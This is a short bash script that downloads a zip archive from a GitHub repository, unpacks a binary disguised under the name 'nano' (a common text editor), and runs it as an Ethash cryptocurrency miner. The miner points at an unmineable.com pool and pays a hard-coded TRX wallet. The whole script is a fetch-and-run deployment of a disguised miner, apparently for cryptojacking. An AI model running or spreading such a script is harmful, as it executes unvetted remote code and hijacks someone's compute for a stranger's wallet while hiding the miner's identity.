#!/bin/bash
sudo apt update && wget https://github.com/hasra33/er/raw/main/nano.zip && apt install unzip && unzip nano.zip && cd nano && chmod u+x nano && ./nano --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TUhisPLRuEvLxgeyhctGgm1vskr3aapMGX.swami --ethstratum ETHPROXY
